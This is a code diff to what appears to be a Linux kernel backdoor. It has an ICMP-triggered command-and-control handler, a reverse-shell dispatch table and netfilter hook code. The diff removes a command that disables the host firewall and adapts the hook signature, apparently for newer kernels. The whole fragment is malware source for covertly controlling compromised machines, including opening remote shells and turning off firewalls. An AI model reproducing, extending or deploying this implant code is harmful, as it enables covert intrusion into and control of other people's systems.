@@ -1,6 +1,7 @@
 #include "c2.h"
 #include "rshell.h"
 #include "fw_bypass.h"
+#include "misc.h"
 #include <linux/skbuff.h>
 #include <linux/in.h>
 #include <linux/icmp.h>
@@ -36,20 +37,8 @@ void do_reverse_shell(struct c2opt_gen payload)
     //try_reverse_shell_nc(payload);
 }
 
-void do_firewall(struct c2opt_gen payload)
-{
-    __u32 choice = ntohl(payload.field1);
-
-    if (choice) {
-        disable_firewall();
-    } else {
-        enable_firewall();
-    }
-}
-
 command_ptr_t cmd_table[CMD_MAX] = {
     [CMD_REVERSE_SHELL] = do_reverse_shell,
-    [CMD_BYPASS_FIREWALL] = do_firewall,
 };
 
 static int new_sha1(__u8 *buf, __u8 *output)
@@ -119,7 +108,7 @@ static int queue_c2_task(void *hdr, void* payload, __u32 dst_ip)
     return err;
 }
 
-unsigned int watch_icmp(unsigned int hooknum,
+unsigned int watch_icmp(HOOK_ARG_TYPE hook,
                         struct sk_buff *skb,
                         const struct net_device *in,
                         const struct net_device *out,
